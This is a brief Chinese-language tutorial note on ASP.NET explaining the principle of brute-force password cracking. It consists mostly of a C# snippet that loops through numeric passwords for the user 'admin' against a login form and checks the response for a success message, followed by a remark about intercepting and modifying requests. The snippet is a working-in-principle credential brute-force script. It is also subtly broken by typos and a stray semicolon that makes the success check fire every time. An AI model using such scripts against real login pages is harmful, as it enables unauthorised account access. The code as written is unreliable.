---
title: Software Development DotNet ASP.NET - 5、暴力破解原理
date: 2013-01-07 14:57:45
categories:
- Software Development
tags:
- Software Development
- ASP.NET
- DotNet
---



```csharp
WebClient wc=new WebClinet();
wc.Encoding=Encoding.UTF8;//中文
for(int i=0;i<500;i++)
{
     string s=wc.DownloadString("…&TextBox1=admin&TextBox2="+i+"&Button1=Button");
    //get请求
     if(s.contain("登陆成功"));
    {
            Console.WriteLine("找到密码："+i);
            return;
    }

}
```

- 外挂拦截发往服务器的请求，改请求，提交。